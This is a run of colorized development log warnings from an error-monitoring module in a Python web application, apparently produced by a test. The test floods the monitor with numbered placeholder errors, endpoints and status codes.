WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869283Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3378'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3379'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869379Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3380'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869427Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3381'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3382'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3383'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869568Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3384'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869616Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3385'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869663Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3386'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869711Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3387'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3388'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3389'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869853Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3390'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3391'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869954Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3392'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3393'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870049Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3394'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870097Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3395'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3396'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3397'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3398'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870298Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3399'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870346Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3400'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3401'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3402'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870492Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3403'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870540Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3404'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870619Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3405'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3406'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870759Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3407'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3408'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3409'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.870985Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3410'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3411'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871120Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3412'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871172Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3413'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871227Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3414'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871277Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3415'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871325Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3416'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871374Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3417'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
